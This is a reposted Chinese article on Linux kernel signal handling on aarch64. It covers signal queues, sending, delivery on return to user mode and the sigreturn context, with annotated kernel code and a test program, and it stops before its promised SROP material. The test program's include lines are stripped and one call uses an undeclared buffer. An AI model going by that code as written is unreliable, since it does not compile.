> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-271200.htm)

> [原创] linux 中的信号处理与 SROP

> 版权声明：本文为 CSDN 博主「ashimida@」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。  
> 原文链接：https://blog.csdn.net/lidan113lidan/article/details/122547854
> 
> 更多内容可关注微信公众号 ![](https://bbs.pediy.com/upload/attach/202201/MYKVSVXH57H9873.jpg)

一、基本概念
======

  信号是事件发生时对进程的通知机制, 其与中断类似, 在到达时都会打断程序的正常执行流程。一个进程 (若具有权限则) 可以向另一个进程或向自身发送信号，其可以作为一种同步技术或进程间通信的原始形式。发往进程的诸多信号通常都源于内核，引发内核为进程产生信号的事件包括:

*   **硬件异常:** 如用户态的访问异常 / 除零异常等，其首先都是由硬件捕获并通知内核的，再由内核通过信号传递给用户态。
    
*   **用户输入的中断字符**: 如 ctrl-c, ctrl-z。
    
*   **软件事件的发生**: 如针对文件描述符的输出变为有效, 终端大小调整, 定时器到期, cpu 执行时间到期, 子进程退出等。
    

  每个信号在系统中都有唯一的编码，其编号随着系统的不同而不同，故程序中应该总是使用符号名来代表这些信号。

  信号分为标准信号和实时信号, **在 linux 中编号 1~31 为标准信号 >31(<=64) 的为实时信号**。

  信号在产生后可能会经历一段时间才会真正被处理 (到达), 在此过程中信号则处于 pending(等待状态), **在内核返回用户态时才会检查信号是否到来,** 故:

*   **若进程向其他进程发送信号**，则通常总要有一段 (极短的)pending 的时间, 直到目标进程被调度到或目标进程正在运行时产生了 el0 异常.
    
*   **若进程向自身发送信号**，则通常在如 * kill 系统调用返回时此信号立即被处理。
    

 **有时为了确保一段代码不被打断，可以通过掩码来屏蔽部分信号，被屏蔽的信号会一直处于等待状态, 直到接触屏蔽**。

  通过 / proc/pid/status 接口可以查看当前进程的信号:

```
## 实现代码参考内核 ./fs/proc/array.c task_sig
tangyuan@ubuntu:~/tests/namespace$ cat /proc/xxx/status
...... 
SigQ:   1/31451                              ## 当前进程信号队列中总共收到了多少个信号
SigPnd: 0000000000000000           ## 当前线程收到过哪些信号,SigPnd(signal pending)是收到的信号掩码
ShdPnd: 0000000000000200           ## 当前*线程组*共享队列中收到了哪些信号, ShdPnd(shared pending)是共享队列中收到的掩码,这里0x200代表收到信号为SIGUSR1
SigBlk: 0000000000000a00           ## 当前线程阻塞的信号掩码,当前SIGUSR1/2信号均被阻塞
SigIgn: 0000000000000000           ## 当前*线程组*忽略的信号,信号忽略是以线程组为单位的
SigCgt: 0000000000000a00         ## 当前*线程组* 捕获的信号,也就是自定义了信号处理函数的信号,当前SIGUSR1/2均自定义了信号处理函数
......

```

linux 中各信号的定义可参考 [0], 这里需要注意的是:

**1. 标准信号不排队，实时信号需排队处理**

*   标准信号不做排队处理:  即内核某线程 / 线程组若收到某个标准信号，则在其被处理前是不会再次在 pending 队列中加入同一个标准信号的。**这意味着若一个标准信号多次到达，其信号处理函数有可能只被调用了一次**。
*   实时信号需要排队处理:   即内核某线程 / 线程组若收到实时信号，则不论之前是否有收到过此信号，都会在 pending 队列新增此信号。**这也意味着每发生一次实时信号其信号处理函数都会被调用一次**。

 **2. 内核线程也可以接收信号**

   虽然信号处理是为用户进程设计的，但在 linux 中内核线程也是可以接受信号的。和用户进程不同的是:

*   内核线程中只可以确定要接受哪个信号，但不能为信号指定具体处理函数
*   内核线程不会主动触发信号处理函数，若想要查看自身收到的信号，内核线程中需要使用循环来判断自身是否收到了信号 (默认的信号处理发生在内核返回到用户态, 内核线程不会触发此流程)
*   内核线程可以指定其接受的某个信号只能由内核态发出，即其可以指定自身不接受用户态发送的信号。
*   内核线程不接受 SIGKILL 信号

   内核线程的信号处理可以参考内核线程函数 jffs2_garbage_collect_thread.

 **3. init 进程不接受 SIGKILL/SIGSTOP 信号**

   见内核 sig_task_ignored 函数

二、信号处理函数的设置
===========

  从内核角度看，一个线程的信号可能保存在两个队列中:

*   一个是线程组共享的信号队列 (task_struct->signal->shared_pending)
*   一个是线程自身私有的信号队列 (task_struct->pending)

  通常信号是发送到线程组共享的信号队列的，此队列中的信号被线程组中的任意线程处理 (一次) 即可，而在用户态看来则是一个信号可能被线程组中的任一线程处理。而通过如 tkill 系统调用也可以将信号直接发送给线程的私有信号队列，此时虽然线程组中所有线程的信号处理函数是同一个，但可以确保此信号只会由某个具体的线程来处理。在内核中信号相关的结构体定义如下:

```
// task_struct中信号相关字段
struct task_struct {
    ......
    /* Signal handlers: */
    struct signal_struct       *signal;        /* 指向线程组共享的信号描述信息的指针 */
    struct sighand_struct __rcu       *sighand;   /* 指向线程组共享的信号处理函数描述信息的指针 */
    /*
       线程私有的被阻塞信号结构体, sigset_t是一个信号掩码, 每个信号在其中占一个bit位,需要注意block和ignore不同:
       * 被设置为ignore后再接收到此信号则会被直接忽略,设置时若发现有已到达的ignore信号也会丢弃。
       * 被设置为blocked后再接收到此信号同样还需要加入到信号队列，只是此时不再向县城发送TFI_SIGPENDING到达信号了,
         后续unblock之后此信号还是会被处理的.
    */
    sigset_t            blocked;       
    sigset_t            real_blocked;
    sigset_t            saved_sigmask;          /* 在sigsuspend等函数等待信号期间临时保存之前的 block 掩码 */
    struct sigpending      pending;            /* 线程私有的信号队列 */
     
    unsigned long          sas_ss_sp;          /* 若线程有单独的信号栈则记录在这里 */
    size_t                  sas_ss_size;
    unsigned int           sas_ss_flags;
    ......
}
 
//只记录部分相关结构体
struct signal_struct {
    ......
    struct list_head   thread_head;    /* 指向线程组组长的task_struct */
    ......
    struct sigpending  shared_pending; /* 线程组的共享信号队列 */
     
    /* thread group exit support */
    int         group_exit_code;        /* 整个线程组是因为哪个信号退出的,见 complete_signal */
    int         group_stop_count;       /* thread group stop support, overloads group_exit_code too */
    unsigned int       flags;             /* see SIGNAL_* flags below */
 
    struct pid *pids[PIDTYPE_MAX];        /* 信号处理时有时会向进程组，会话发送信号，这里记录进程组和会话pid等相关信息 */
    ......
}
 
struct sighand_struct {
    spinlock_t      siglock;       
    refcount_t      count;              /* 引用计数 */
    wait_queue_head_t   signalfd_wqh;   /* 等待此signal 的signalfd 队列,见 signalfd_read */
    struct k_sigaction action[_NSIG];  /* 记录每个信号的信号处理函数等相关信息 */
};
 
struct k_sigaction {
    struct sigaction sa;
    ......
};
 
struct sigaction {
    /* 信号处理函数指针,
       * 若为0(SIG_DFL)则代表使用默认信号处理函数
       * 若为1(SIG_IGN)则代表此信号被忽略
       * 若为2(SIG_KTHREAD)则代表当前内核线程可以接受用户态/内核态向其发送此信号
       * 若为3(SIG_KTHREAD_KERNEL)则代表当前内核线程只可以接受内核态向其发送此信号
    */
    __sighandler_t  sa_handler;
    unsigned long  sa_flags;       /* 某些信号会有一些细节控制flag，如SIGCHLD可以指定SA_NOCLDSTOP */
    sigset_t sa_mask;              /* 当当前信号正在处理时需屏蔽的其他信号，其可以用于防止信号处理函数被再次中断 */
};

```

  各结构体关系如下图:

![](https://bbs.pediy.com/upload/attach/202201/490870_8BR4T46PXSMS9WK.jpg)

  linux 用户态可以通过 signal/sigaction 函数设置信号处理函数, 二者系统调用接口如下:

```
SYSCALL_DEFINE3(sigaction, int, sig, const struct old_sigaction __user *, act, struct old_sigaction __user *, oact);
SYSCALL_DEFINE2(signal, int, sig, __sighandler_t, handler);

```

  二者最终均调用了 do_sigaction 函数, 这里以简单的 **sys_signal** 函数为例:

```
/* 将当前线程组信号sig的处理函数设置为handler, 并返回旧的信号处理函数指针 */
SYSCALL_DEFINE2(signal, int, sig, __sighandler_t, handler)
{
    struct k_sigaction new_sa, old_sa;
    int ret;
 
    new_sa.sa.sa_handler = handler;                   /* 构建一个 sigaction结构体并指定用户态的信号处理函数 handler */
    new_sa.sa.sa_flags = SA_ONESHOT | SA_NOMASK;        /* signal 函数默认是单次触发 */
     
    sigemptyset(&new_sa.sa.sa_mask);                /* 清空/重置当前信号处理时的掩码 */
     
        /* 设置当前线程组信号sig的处理函数，并返回此信号旧的处理函数指针; 若信号设置为被忽略则需删除已收到的所有此信号 */
    ret = do_sigaction(sig, &new_sa, &old_sa);     
 
    return ret ? ret : (unsigned long)old_sa.sa.sa_handler;   /* 出错返回错误码,否则返回原有的handler */
}

```

 **do_sigaction**:

```
/*
  此函数负责为当前线程组设置信号sig的信号处理函数(记录在act中),并通过oact返回之前的信号处理函数.
  如果act中指定信号sig会被忽略，那么会删除此线程组信号队列(包括线程组所有线程私有信号队列)中已经接受到的此信号.
*/
int do_sigaction(int sig, struct k_sigaction *act, struct k_sigaction *oact)
{
    struct task_struct *p = current, *t;
    struct k_sigaction *k;
    sigset_t mask;
 
    /* 若非有效信号([1,64]之外的信号),或是不可屏蔽信号则返回错误。不可屏蔽信号(SIG_KILL/SIG_STOP)不能设置handler */
    if (!valid_signal(sig) || sig < 1 || (act && sig_kernel_only(sig)))
        return -EINVAL;
 
    k = &p->sighand->action[sig-1];     /* 获取当前线程组中此信号的 action 数组 */
     
    if (oact)                          /* 如果需要获取旧的信号处理信息,则通过oact 返回 */
        *oact = *k;
    .......
    if (act) {
        /*  传入的sa_mask为此信号处理函数执行过程中需要屏蔽的其他信号, SIGKILL/SIGSTOP总是不可屏蔽信号,需要去除 */
        sigdelsetmask(&act->sa.sa_mask, sigmask(SIGKILL) | sigmask(SIGSTOP));
                   
        *k = *act;        /* 将新的action结构体复制到线程组此信号的action结构体中, 信号处理函数设置完毕 */
          
        /*
           如果当前信号被设置为要忽略(此信号handler设置为SIG_IGN,或设置为SIG_DFL且此信号默认行为是忽略), 则需要同时删除此线程所
          在线程组中所有信号队列中已经收到的所有此信号. 这包括线程组的shared_pending和各个线程自身的pending队列中:
            * 已经加入队列的信号结构体(sigqueue)的删除
            * 清除这些队列自身sigpending->signal中此sig的掩码
         */
        if (sig_handler_ignored(sig_handler(p, sig), sig)) {
            sigemptyset(&mask);         /* 生成此信号对应的掩码 */
            sigaddset(&mask, sig);
             
            flush_sigqueue_mask(&mask, &p->signal->shared_pending);      /* 删除shared_pending中已有的所有此信号 */
            for_each_thread(p, t)                 
                flush_sigqueue_mask(&mask, &t->pending);                /* 同时删除线程组各个线程中的此信号 */
        }
    }
 
    return 0;
}

```

三、信号的发送
=======

  这里以用户态入口系统调用 sys_kill 为例, 其定义如下:

```
SYSCALL_DEFINE2(kill, pid_t, pid, int, sig)
{
    struct kernel_siginfo info;
 
        /* 为signal 准备 kernel_siginfo 结构体*/
    prepare_kill_siginfo(sig, &info);
 
    return kill_something_info(sig, &info, pid);
}
 
static int kill_something_info(int sig, struct kernel_siginfo *info, pid_t pid)
{
    int ret;
 
    if (pid > 0)
        return kill_proc_info(sig, info, pid);           /* 若pid > 0 ，则向此pid对应的线程组发送信号 */
    ......
    return ret;
}

```

```
//这里以pid>0为例，kill_proc_info函数会依次调用到 _send_signal处理信号,在此过程中会调用check_kill_permission检查发送权限
//kill_proc_info => kill_pid_info => group_send_sig_info => do_send_sig_info => send_signal
/*
   sig: 要发送的信号
   t: 信号要发送到哪个task
   type: 信号是否要同时发给此task所在的线程组/进程组/会话,若为PIDTYPE_PID则代表信号只发给当前task(线程)
   force: 若信号来自内核或祖先namespace,则force为true
*/
static int __send_signal(int sig, struct kernel_siginfo *info, struct task_struct *t,
            enum pid_type type, bool force)
{
    struct sigpending *pending;
    struct sigqueue *q;
    int ret = 0, result;
    ......
    /* 若当前信号是线程组要忽略的信号,则这里直接返回; 此函数中还预处理了stop/continue信号的关系 */
    if (!prepare_signal(sig, t, force))  goto ret;
     
    /*
       若信号是发给特定线程的(type=PIDTYPE_PID),则使用t->pending(当前线程的pending队列)
       若信号是发给线程组/会话的,则使用shared_pending(共享的存储pending的队列)
    */
    pending = (type != PIDTYPE_PID) ? &t->signal->shared_pending : &t->pending;
    ......
    /* 
       非ignore的信号也不一定总是要插入信号队列:
       * 对于非实时信号,如果pending队列中已有此信号则不必重复添加,直接返回
       * 对于实时信号和未曾添加过的信号,则向队列中添加此信号
    */
    if (legacy_queue(pending, sig))
        goto ret;
    ......
    if ((sig == SIGKILL) || (t->flags & PF_KTHREAD))  /* 不可向内核线程发送SIGKILL信号 */
        goto out_set;
    ......
    q = __sigqueue_alloc(sig, t, GFP_ATOMIC, override_rlimit, 0); /* 分配存储此信号信息的 sigqueue 结构体 */
 
    if (q) {
        list_add_tail(&q->list, &pending->list);                 /* 将信号添加到 sigpending队列的末尾 */
        ......
    } else 
        ......
 
out_set:
    signalfd_notify(t, sig);                           /* 支持signalfs的信号通知链 */
    sigaddset(&pending->signal, sig);                   /* 将信号加入pending队列的信号掩码中，此掩码用来快速判断当前队列收到了哪些信号 */
    if (type > PIDTYPE_TGID) {                           /* 如果此信号是发送到信号组或session的 */
        .......
    }
 
    complete_signal(sig, t, type);                        /* 若信号没有被block等情况下, 为当前线程标记 TIF_SIGPENDING */
ret:
    ......
    return ret;
}

```

  其中 prepare_signal 定义如下:

```
static bool prepare_signal(int sig, struct task_struct *p, bool force)
{
    struct signal_struct *signal = p->signal;
    struct task_struct *t;
    sigset_t flush;
 
    if (signal->flags & (SIGNAL_GROUP_EXIT | SIGNAL_GROUP_COREDUMP)) { /* 如果线程组正在退出过程中, 则此信号变为 SIGKILL */
        if (!(signal->flags & SIGNAL_GROUP_EXIT))
            return sig == SIGKILL;
    } else if (sig_kernel_stop(sig)) {  /* 如果线程收到stop信号，则移除已有的所有continue信号 */
        .......
    } else if (sig == SIGCONT) {      /* 若收到continue信号则唤醒线程 */ 
        .......
    }
 
    return !sig_ignored(p, sig, force);  /* 如果此信号不被忽略，则返回true */
}
 
static bool sig_ignored(struct task_struct *t, int sig, bool force)
{
    /*
       若线程已经设置了此信号的blocked掩码,则说明此信号只是被block了,不能忽略此时不会判断handler是否为SIG_IGN.
    */
    if (sigismember(&t->blocked, sig) || sigismember(&t->real_blocked, sig))
        return false;
    .......
    return sig_task_ignored(t, sig, force);
}
 
static bool sig_task_ignored(struct task_struct *t, int sig, bool force)
{
    void __user *handler;
    handler = sig_handler(t, sig);   /* 获取信号handler */
 
    /* SIGKILL/SIGSTOP不能发送给全局init进程 */
    if (unlikely(is_global_init(t) && sig_kernel_only(sig)))
        return true;
    .......
    /* 若向内核线程发送信号时此内核线程指定了SIG_KTHREAD_KERNEL,则只有内核可向其发送信号 */
    if (unlikely((t->flags & PF_KTHREAD) &&
             (handler == SIG_KTHREAD_KERNEL) && !force))
        return true;
 
    /* handler为SIG_IGN;或为SIG_DFL但默认处理方式为ignore的信号直接忽略 */
    return sig_handler_ignored(handler, sig);
}

```

  其中 complete_signal 函数定义如下:

```
static void complete_signal(int sig, struct task_struct *p, enum pid_type type)
{
    struct signal_struct *signal = p->signal;
    struct task_struct *t;
 
    if (wants_signal(sig, p))     /* 此函数返回true(即此线程希望收到信号),则后续需要为线程p标记p->flags|=TIF_SIGPENDING */
        t = p;
    /* 若当前线程暂时不想收到信号, 且此信号只能此线程接收(包括两种情况:1)此信号就是发送给当前线程的; 2) 其线程组中没有其他线程;
      则此时不设置 TIF_SIGPENDING 直接返回 */
    else if ((type == PIDTYPE_PID) || thread_group_empty(p))
        return;
    else {                         /* 否则找到线程组中一个可以处理此信号的线程并向其发送信号 */
        t = signal->curr_target;
        while (!wants_signal(sig, t)) {
            t = next_thread(t);
            if (t == signal->curr_target)
                return;
        }
        signal->curr_target = t;
    }
 
    ......
 
    signal_wake_up(t, sig == SIGKILL);   /* 为线程t标记  TIF_SIGPENDING */
    return;
}
 
static inline bool wants_signal(int sig, struct task_struct *p)
{
    if (sigismember(&p->blocked, sig))     /* 若task p block了信号sig,则此时无需为其设置 TIF_SIGPENDING */
        return false;
 
    if (p->flags & PF_EXITING)                /* 若当前进程正在退出，则不再需要signal */
        return false;
 
         
    if (sig == SIGKILL)                      /* SIGKILL信号总是无法block(在设置信号时会确保blocked掩码中未屏蔽SIGKILL/SIGSTOP */
        return true;
 
    if (task_is_stopped_or_traced(p))
        return false;
 
    return task_curr(p) || !task_sigpending(p);  /* 已有TIF_SIGPENDING的进程无需重新设置 */
}
 
static inline void signal_wake_up(struct task_struct *t, bool resume)
{
    signal_wake_up_state(t, resume ? TASK_WAKEKILL : 0);
}
 
void signal_wake_up_state(struct task_struct *t, unsigned int state)
{
        /* 标记线程t中有信号需要处理 */
    set_tsk_thread_flag(t, TIF_SIGPENDING);
 
    /* 唤醒线程t */
    if (!wake_up_state(t, state | TASK_INTERRUPTIBLE))
        kick_process(t);
}

```

四、信号的处理与等待
==========

4.1 信号处理概述
----------

### 1. 信号处理的时机

  由前可知，信号发送操作除了将具体信号设置到线程的共享 / 私有队列外，还会为此线程标记 TIF_SIGPENDING flags(若当前线程 block 了信号，则有可能会发送给线程组其他线程), **不论线程收到了多少个信号都会通过这一个 flag 标记, 只要线程的 tsk->flags 标记了 TIF_SIGPENDING 则就说明此线程收到了信号**。

  内核在检查是否有信号到达时同样检查的也是线程的 TIF_SIGPENDING flag, 内核中的信号处理可以分为两种场景:

 **1) 内核返回用户态时检查并处理信号**

    由于信号在多大多数情况下是给用户态进程使用的，故比较常见的是此场景, 通常从 EL0 异常入口进入内核并返回到用户态之前都会检查当前线程是否有要处理的信号, 如:

*   EL0 同步异常, 如 EL0 发起的系统调用, 指令 / 数据访问错误.
    
*   EL0 异步异常, 如 EL0 时发生的 IRQ 中断.

 **2) 内核线程通过循环检查自身的信号**

    这种场景比较少见, 偶尔出现在一些需要与用户态交互的内核线程中, 此时内核线程可以决定只接受内核发送的信号 (SIG_KTHREAD), 也可以接受用户态信号 (SIG_KTHREAD). 和用户态显著的区别在于, 内核信号更类似一个个 case, 其不能指定信号处理函数，内核线程中需要自己实现代码来循环检测是否有信号出现 (内核线程不会执行到 1 的流程，故若收到信号必须主动处理) 在情景 1/2 中内核均通过类似 **signal_pending** 的逻辑判断当前线程是否有需要处理的信号.

### 2、信号处理流程描述

内核在返回用户态之前检查并处理信号, 当前线程首先会无视 (不忽略也不处理) 其自身阻塞的信号，对于未被阻塞的信号分为三种情况:

 1) 使用默认行为的信号 (SIG_DFL)

*   如果默认行为是忽略此信号, 则内核直接忽略此信号
*   如果默认行为是终止 / 停止 / 继续, 则内核直接处理

 2) 直接忽略的信号 (SIG_IGN)

*   内核直接忽略标记为忽略的信号

 3) 需要执行 handler 的信号

*   内核需要在信号栈保存当前用户态上下文，并为用户态重置一个信号上下文
*   内核返回用户态后执行信号上下文 (即信号处理函数), 执行完毕后通过 ret 指令返回
*   信号上下文会直接返回到系统调用 sys_rt_sigreturn, 此系统调用中恢复之前的用户态上下文
*   内核再次返回用户态，恢复用户态上下文执行

需要注意的是:

**1) 阻塞是以线程为单位的:** 

    线程组共享的信号 (常规信号) 被一个线程阻塞并不代表其不能被处理, 同一线程组的任一其他线程均可处理此信号。

**2) 用户态上下文:**

    用户态代码执行到任意位置时都有可能有异常触发, 不论是同步 / 异步异常在返回时都会检查当前进程是否有信号要处理, 对于需要执行信号处理函数的信号其被中断前的**用户态上下文**必须得以保存，否则信号处理函数执行完毕后无法恢复原有运行环境. 在 linux 中此用户态上下文是被在异常发生时存储，在信号处理函数执行的过程中被保存在用户 / 信号栈中的，在信号处理完毕后同样需要从栈中恢复。

**3) 信号上下文:**

    信号上下文指的是信号处理函数的上下文, 主要包括:

*   PC: 即信号处理函数的指针
*   SP: 信号处理函数可以使用当前用户线程的栈，也可以单独指定一个信号栈 (后面以线程栈为例); 内核在执行信号处理函数前会在栈上保存用户上下文以便执行完毕后的恢复
*   LR: 信号处理函数也是一个普通函数, 其通过 ret 指令返回，内核则需要让信号处理函数返回时执行 sys_rt_sigreturn 来恢复用用户态上下文, 故内核需要将信号处理函数的返回地址设置为 sys_rt_sigreturn 函数地址.

4) **当异常返回前发现多个信号处理函数时:**

    异常返回前会循环遍历**所有未被当前线程 block 的信号**，如果有多个信号均需要执行信号处理函数, 那么内核会在进程栈中依次堆叠多个信号栈帧, 如某线程依次收到了需要执行 handler 的 sig1/sig2 两个信号, 则内核会先为 sig1 设置栈帧，然后为 sig2 设置栈帧。**而最终用户态的执行流程是 sig2_handler => sys_rt_sigreturn => sig1_handler => sys_rt_sigreturn => 用户态上下文**， 即**后到的信号被优先处理** (举例见备注)。

**5) 当信号处理函数执行过程中再次被信号中断时:**

    若用户态正在执行信号处理函数，此时没有被当前线程 block 的信号可能导致此信号处理程序被再次中断，同样是后到的信号被优先处理，但不同的是此时可能导致竞态死锁问题 (信号处理函数需要设计为可重入).

**6) 安全性分析:**

    这里的安全性分析仅针信号处理过程中是否会导致权限提升，并不针对如 SROP 等利用信号处理的利用方式。信号处理的过程中在用户栈中保存了用户态上下文，在信号处理完成后需要内核 (sys_rt_sigreturn) 为用户态恢复此上下文, 用户态上下文的数据包括:

```
struct ucontext {
    unsigned long    uc_flags;
    struct ucontext     *uc_link;
    stack_t       uc_stack;        
    sigset_t      uc_sigmask;     /* 重置的block掩码 */
    __u8          __unused[1024 / 8 - sizeof(sigset_t)];
    struct sigcontext uc_mcontext;
};
 
struct sigcontext {
    __u64 fault_address;
    __u64 regs[31];                    /* 通用寄存器 */
    __u64 sp;
    __u64 pc;
    __u64 pstate;                  /* pstate 状态寄存器 */
    __u8 __reserved[4096];         /* 4K reserved for FP/SIMD state and future expansion */
};

```

  用户态跳转到 / 修改任何用户态数据均不会有权限问题，**其中唯一的问题就是内核在信号返回时会从用户态读取 pstate 并恢复到内核的 CPSR_EL1**; pstate 中记录了一些需要恢复的如比较 j 结果, 是否溢出等，但同时也记录了一些安全相关的如当前异常级别等 bit 位，故如果不加检查的直接从用户态恢复此值则攻击者可以轻易利用信号处理来提升异常级别 (如用户态由 EL0=>EL1), **内核处理的方式则是恢复用户态上下文之前添加了一个检查函数 valid_user_regs，以确保 pstate 的正确性**, 代码如下:

```
int valid_user_regs(struct user_pt_regs *regs, struct task_struct *task)
{
    user_regs_reset_single_step(regs, task);       /* 若需要则重置单步调试 */
 
    if (is_compat_thread(task_thread_info(task)))
        return valid_compat_regs(regs);
    else
        return valid_native_regs(regs);                /* pstate必须设置为EL0, 开启所有中断, aarch64模式才有效 */
}
 
static int valid_native_regs(struct user_pt_regs *regs)
{
         
    regs->pstate &= ~SPSR_EL1_AARCH64_RES0_BITS;       /* pstate 中reserved bit 直接置零 */
 
    /*
       * user_mode 要求 pstate最后4bit为必须为 0x0 (也就是返回到用户态必须是EL0)
       * 64位不能返回到aarch32;
       * 且当前的异常掩码必须全部置零(开中断)
    */
    if (user_mode(regs) && !(regs->pstate & PSR_MODE32_BIT) &&
        (regs->pstate & PSR_D_BIT) == 0 &&
        (regs->pstate & PSR_A_BIT) == 0 &&
        (regs->pstate & PSR_I_BIT) == 0 &&
        (regs->pstate & PSR_F_BIT) == 0) {
        return 1;
    }
 
    /* Force PSR to a valid 64-bit EL0t */
    regs->pstate &= PSR_N_BIT | PSR_Z_BIT | PSR_C_BIT | PSR_V_BIT;
 
    return 0;
}

```

### 3、信号处理举例

  测试代码:

```
/* 此代码针对aarch64平台, 其他平台由于ucontext结构体定义不同编译不通过 */
#include  #include  #include  #include  #include  #include  #include  #include  void siguser2_handler(int signo, siginfo_t *info, void *ctx)
{
    struct ucontext *uc = ctx;
    unsigned long *fp = __builtin_frame_address(0);
    unsigned long *lr = __builtin_return_address(0);
 
    printf("[+][siguser2]: current fp:%p, lr:%p\n", fp, lr);
 
    printf("[+][siguser2]: ucontext:%p, size:%x\n", uc, sizeof(struct ucontext));
    printf("[+][siguser2]: prev context: pc:%p, sp:%p, lr:%p\n", \
        uc->uc_mcontext.pc, uc->uc_mcontext.sp, uc->uc_mcontext.regs[30]);
 
    return;
}
 
void siguser1_handler(int signo, siginfo_t *info, void *ctx)
{
    struct ucontext *uc = ctx;
    unsigned long *fp = __builtin_frame_address(0);
    unsigned long *lr = __builtin_return_address(0);
 
    printf("[+][siguser1]: current fp:%p, lr:%p\n", fp, lr);
 
    printf("[+][siguser1]: ucontext:%p, size:%x\n", uc, sizeof(struct ucontext));
    printf("[+][siguser1]: prev context: pc:%p, sp:%p, lr:%p\n", \
        uc->uc_mcontext.pc, uc->uc_mcontext.sp, uc->uc_mcontext.regs[30]);
 
    return;
}
 
int main()
{
    struct sigaction act;
    sigset_t set, oldset;
 
    printf("[+] current pid:%d, setting siguser1_handler:%p, siguser2_handler:%p ...\n", \
        getpid(), siguser1_handler, siguser2_handler);
     
    act.sa_sigaction = siguser1_handler;             
    act.sa_flags = SA_SIGINFO;
    sigemptyset(&act.sa_mask);
    sigaction(SIGUSR1, &act, NULL);
    act.sa_sigaction = siguser2_handler;
    sigaction(SIGUSR2, &act, NULL);                               /* 设置SIGUSER1/SIGUSER2的handler */
 
    printf("[+] setting mask for SIGUSR1/2 ...\n");
 
    sigemptyset(&set);
    sigemptyset(&oldset);
    sigaddset(&set, SIGUSR1);
    sigaddset(&set, SIGUSR2);
    sigprocmask(SIG_SETMASK, &set, &oldset);                  /* 先block SIGUSER1/SIGUSER2 信号的处理 */
 
    printf("[+] sending signal SIGUSR1 ...\n");
    kill(getpid(), SIGUSR1);
    printf("[+] sending signal SIGUSR2 ...\n");
    kill(getpid(), SIGUSR2);                                   /* 向当前进程发送SIGUSER1/SIGUSER2信号, 此时线程同时拥有两个需要执行handler的信号 */
 
    printf("[+] unmask SIGUSR1/2 ...\n");
                                                                /* unblock SIGUSER1/SIGUSER2 信号的处理 *, 此系统调用返回时处理线程的两个信号 */
    sigprocmask(SIG_SETMASK, &oldset, NULL);                  /* 此时会先调用SIGUSER2信号处理函数, 再调用SIGUSER1信号处理函数,然后再返回main函数 */
 
    char buf1[] = "[+] runing in main\n";
    write(1, buf1, sizeof(buf));
 
    return 0;
} 
```

  输出结果:

```
/ # ./main                                                                                                                 [4/7606]
[+] current pid:112, setting siguser1_handler:0x400838, siguser2_handler:0x4007ac ...
[+] setting mask for SIGUSR1/2 ...
[+] sending signal SIGUSR1 ...
[+] sending signal SIGUSR2 ...
[+] unmask SIGUSR1/2 ...
[+][siguser2]: current fp:0xffffc46aac60, lr:0xffff9c2b6888                                              ## siguser2返回地址为 sys_rt_sigreturn
[+][siguser2]: ucontext:0xffffc46aad30, size:11d0
[+][siguser2]: prev context: pc:0x400838, sp:0xffffc46abf10, lr:0xffff9c2b6888     ## siguser2上一个栈帧pc为siguser1_handler,其一句都尚未执行
                                                                                                                                                                    ## siguser1的返回地址也是 sys_rt_sigreturn
[+][siguser1]: current fp:0xffffc46abec0, lr:0xffff9c2b6888                                              ## siguser1的返回地址为 sys_rt_sigreturn(同上)
[+][siguser1]: ucontext:0xffffc46abf90, size:11d0
[+][siguser1]: prev context: pc:0x413b8c, sp:0xffffc46ad170, lr:0x4056cc                   ## siguser1上一个栈帧为系统调用的下一条指令(__pthread_sigmask中svc的下一条指令)
                                                                                                                                                                  ## siguser1上一个栈帧的返回地址即为__pthread_sigmask的返回地址(__sigprocmask函数中的地址)
[+] runing in main
 
## 进程映射
00400000-0047a000 r-xp 00000000 00:02 5                                  /main
0048a000-0048b000 r--p 0007a000 00:02 5                                  /main
0048b000-0048d000 rw-p 0007b000 00:02 5                                  /main
0048d000-00496000 rw-p 00000000 00:00 0
25b2e000-25b50000 rw-p 00000000 00:00 0                                  [heap]
ffff9c2b4000-ffff9c2b6000 r--p 00000000 00:00 0                          [vvar]
ffff9c2b6000-ffff9c2b7000 r-xp 00000000 00:00 0                          [vdso]
ffffc468d000-ffffc46ae000 rw-p 00000000 00:00 0                          [stack]

```

  整个信号处理的代码执行流程如下图所示:

![](https://bbs.pediy.com/upload/attach/202201/490870_GP85QUMB8JX887Z.jpg)

4.2 EL0 异常返回前的中断检查与处理
---------------------

  EL0 中不论是同步 / 异步异常, 最终均会调用函数 exit_to_user_mode 返回用户态, 此函数中负责检查当前线程是否有需要处理的信号, 定义如下:

```
static __always_inline void exit_to_user_mode(struct pt_regs *regs)
{
    prepare_exit_to_user_mode(regs);    /* 关中断, 检查返回到用户态之前是否有未完成的工作 */
    mte_check_tfsr_exit();
    __exit_to_user_mode();
}
 
static __always_inline void prepare_exit_to_user_mode(struct pt_regs *regs)
{
    unsigned long flags;
     
    local_daif_mask();   /* 关中断 */
     
    flags = READ_ONCE(current_thread_info()->flags);   /* 获取当前线程的flag,检查是否有等待处理的工作 */
     
    if (unlikely(flags & _TIF_WORK_MASK))                /* 如果有未完成的工作,则调用 do_nitify_resume处理 */
        do_notify_resume(regs, flags);
}
 
/*
   do_notify_resume 函数用来处理线程返回前被通知的未完成的工作,此函数直到处理完所有工作后才返回, 包括 进程调度,信号处理等.
   这里需要注意的是,若当前线程中有多个信号需要处理,那么do_notify_resume会为每个信号都调用do_signal函数,直到所有信号处理后
  才返回。故在用户态角度其在执行某个信号处理函数时可能发现栈帧还堆叠着多个其他待执行的信号处理函数。
*/
void do_notify_resume(struct pt_regs *regs, unsigned long thread_flags)
{
    do {
        if (thread_flags & _TIF_NEED_RESCHED) {
            local_daif_restore(DAIF_PROCCTX_NOIRQ);                 /* 如果是需要调度，则先关中断 */
            schedule();
        } else {
            local_daif_restore(DAIF_PROCCTX);                       /* 非调度则开中断即可 */
            .......
 
            if (thread_flags & (_TIF_SIGPENDING | _TIF_NOTIFY_SIGNAL)) /* do_signal函数一次处理一个信号, 系统调用的restart也在这里处理 */
                do_signal(regs);
            .......
        }
 
        local_daif_mask();                                          /* 关中断 */
        thread_flags = READ_ONCE(current_thread_info()->flags);        /* 再次检查是否还有未完成的工作 */
    } while (thread_flags & _TIF_WORK_MASK);                        /* 如果还有未完成工作,则循环处理 */
}

```

  其中 **do_signal** 是信号处理的入口, 此函数一次处理一个信号, 其定义如下:

```
/*
   此函数只在内核返回用户态时被嗲用, regs是内核栈上的指针。在EL0异常发生时, 
